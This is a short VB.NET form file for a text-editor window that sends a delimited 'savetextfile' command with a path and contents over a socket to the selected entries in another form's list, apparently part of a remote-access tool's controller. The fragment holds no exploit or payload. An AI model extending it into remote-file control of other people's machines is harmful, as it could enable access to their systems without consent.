Public Class Form39
    Public xxx As Integer
    Public pathoftext As String
    Public yy As String = "|U|"

 


    Private Sub Text_Editor_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        MenuStrip1.Renderer = New clsVistaToolStripRenderer

    End Sub

    Private Sub SaveToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem1.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "savetextfile" & yy & pathoftext & yy & TextBox1.Text)
        Next
    End Sub

    Private Sub ExitToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem1.Click
        Me.Close()
    End Sub
End Class